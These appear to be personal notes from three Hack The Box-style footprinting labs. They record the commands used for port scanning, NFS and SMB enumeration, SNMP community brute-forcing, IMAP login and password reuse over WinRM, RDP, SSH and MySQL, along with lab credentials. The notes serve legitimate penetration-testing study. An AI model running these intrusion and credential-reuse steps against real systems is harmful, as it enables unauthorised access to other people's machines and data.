- [ ] Lab1
```sh
rustscan -a 10.129.187.189
rustscan -t 2000 -a 10.129.187.189
nmap -sC -sV -v -p2121 10.129.187.189
nmap -sU -F -v 10.129.187.189
```
![[Pasted image 20250604081851.png]]
![[Pasted image 20250604081758.png]]
```
ceil:qwer1234
```
![[Pasted image 20250604121948.png]]
![[Pasted image 20250604122024.png]]
- [ ] Lab2
```sh
rustscan -t 2000 -a 10.129.186.101
```
![[Pasted image 20250604122925.png]]
```sh
showmount -e 10.129.186.101
mount -t nfs 10.129.186.101:/TechSupport ./out -o nolock
```
![[Pasted image 20250604123140.png]]
![[Pasted image 20250604123333.png]]
```sh
user: alex, alex.g@web.dev.inlanefreight.htb
pass: lol123!mD

nxc smb 10.129.202.41 -u alex -p 'lol123!mD' --shares

nxc smb 10.129.202.41 -u alex -p 'lol123!mD' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./output
```
![[Pasted image 20250604125006.png]]
![[Pasted image 20250604125246.png]]
```sh
user: sa
pass: 87N1ns@slls83
# rpc
rpcclient -U sa 10.129.202.41
# winrm
evil-winrm -i 10.129.202.41 -u alex -p 'lol123!mD'
evil-winrm -i 10.129.202.41 -u sa -p '87N1ns@slls83'
# rdp
xfreerdp /v:10.129.202.41 /u:'alex' /p:'lol123!mD'
remmina -c rdp://alex@10.129.202.41
# password reuse
xfreerdp /v:10.129.202.41 /u:'Administrator' /p:'87N1ns@slls83'
# output
user: HTB
pass: lnch7ehrdn43i7AoqVPK4zWR
```
![[Pasted image 20250604211643.png]]
![[Pasted image 20250604214201.png]]
- [ ] Lab3
```sh
rustscan -t 2500 -a 10.129.202.20
nmap -sU -F -v  10.129.202.20
nmap 10.129.202.20 -v -sV -p110,143,993,995 -sC
```
![[Pasted image 20250604215310.png]]
![[Pasted image 20250604215743.png]]
```sh
# snmp
nmap -v -sU -sC -p 161 10.129.202.20
nc -nv -u 10.129.202.20 161
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
hydra -P /path/to/wordlist.txt -v 10.129.202.20 snmp
snmpwalk -v2c -c backup  10.129.202.20
# imap and pop3
curl -k 'imaps://10.129.202.20' --user tom:NMds732Js2761
```
![[Pasted image 20250604220816.png]]
```
STRING: "Admin <tech@inlanefreight.htb>"
STRING: "NIXHARD"
STRING: "Inlanefreight"
STRING: "/opt/tom-recovery.sh"
STRING: "tom NMds732Js2761"
```
![[Pasted image 20250604220944.png]]
```sh
openssl s_client -connect 10.129.202.20:imaps
> a1 LOGIN tom NMds732Js2761
> a2 LIST "" "*"
> a3 SELECT "INBOX"
> a4 FETCH 1 BODY[]
> a5 SELECT "Notes"
> a6 SELECT "Important"
> a7 SELECT "Meetings"
```
SSH!!!
```sh
ssh -i key tom@10.129.202.20
```
![[Pasted image 20250604221723.png]]
```sh
mysql -u tom -pNMds732Js2761

```
![[Pasted image 20250604222625.png]]
![[Pasted image 20250604222748.png]]
